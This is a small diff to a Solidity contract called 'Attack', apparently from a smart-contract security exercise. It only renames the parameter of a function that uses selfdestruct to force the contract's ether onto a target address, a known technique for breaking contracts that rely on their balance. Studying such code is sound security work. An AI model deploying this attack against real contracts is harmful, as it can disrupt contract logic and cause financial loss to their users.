@@ -2,8 +2,8 @@
 pragma solidity ^0.8.9;
 
 contract Attack {
-    function attack(address attacking) public payable {
-        selfdestruct(payable(attacking));
+    function attack(address des) public payable {
+        selfdestruct(payable(des));
     }
 
     uint256 public num = 10;
